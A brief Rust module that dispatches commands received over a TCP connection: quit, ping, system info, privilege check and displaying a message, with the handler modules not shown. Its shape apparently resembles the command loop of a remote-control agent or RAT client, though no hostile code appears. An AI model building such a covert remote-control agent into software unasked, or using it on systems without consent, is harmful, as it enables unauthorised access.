use std::net::TcpStream;

pub mod system;
pub mod ping;

pub fn dispatch(instruct: Vec<&str>, conn: &mut TcpStream) -> Result<bool, String> {    
    match instruct.first() {
        Some(&"q") => Ok(false),
        Some(&"ping") => ping::run(conn),

        // System interaction
        Some(&"sysinfo") => system::sysinfo(conn),
        Some(&"check") => system::check_privileges(conn),
        Some(&"display") => system::display_message(&instruct),

        // No registered command
        _ => Ok(true)
    }
}